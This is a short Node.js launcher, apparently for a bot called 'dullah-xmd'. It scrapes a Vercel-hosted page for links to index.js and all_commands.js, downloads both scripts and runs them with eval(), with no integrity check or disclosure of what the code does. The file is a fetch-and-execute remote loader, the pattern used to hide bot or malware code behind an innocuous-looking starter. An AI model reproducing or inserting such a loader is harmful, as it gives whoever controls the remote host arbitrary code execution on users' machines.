'use strict';

// Include required modules
const axios = require('axios');
const cheerio = require('cheerio'); // Use Cheerio to parse HTML

// Define the URL of the page where the links are listed
const webPageUrl = 'https://dullah-xmd-commands-phi.vercel.app/'; // The page with your links

// Function to fetch and extract the URL for index.js and all_commands.js
async function fetchScripts() {
    try {
        // Fetch the webpage content
        const response = await axios.get(webPageUrl);
        const htmlContent = response.data;

        // Parse the HTML content using Cheerio
        const $ = cheerio.load(htmlContent);

        // Find the links dynamically
        const indexUrl = $('a:contains("index.js")').attr('href');
        const allCommandsUrl = $('a:contains("all_commands.js")').attr('href');

        if (!indexUrl) throw new Error('index.js not found on the webpage.');
        if (!allCommandsUrl) throw new Error('all_commands.js not found on the webpage.');

        console.log('Fetching index.js from:', indexUrl);
        console.log('Fetching all_commands.js from:', allCommandsUrl);

        // Fetch and execute index.js
        const indexScriptResponse = await axios.get(indexUrl);
        eval(indexScriptResponse.data);
        console.log('✅ index.js loaded successfully!');

        // Fetch and execute all_commands.js
        const allCommandsScriptResponse = await axios.get(allCommandsUrl);
        eval(allCommandsScriptResponse.data);
        console.log('✅ all_commands.js loaded successfully!');

    } catch (error) {
        console.error('❌ Error fetching scripts:', error.message || error);
    }
}

// Execute the fetch function for scripts
fetchScripts();
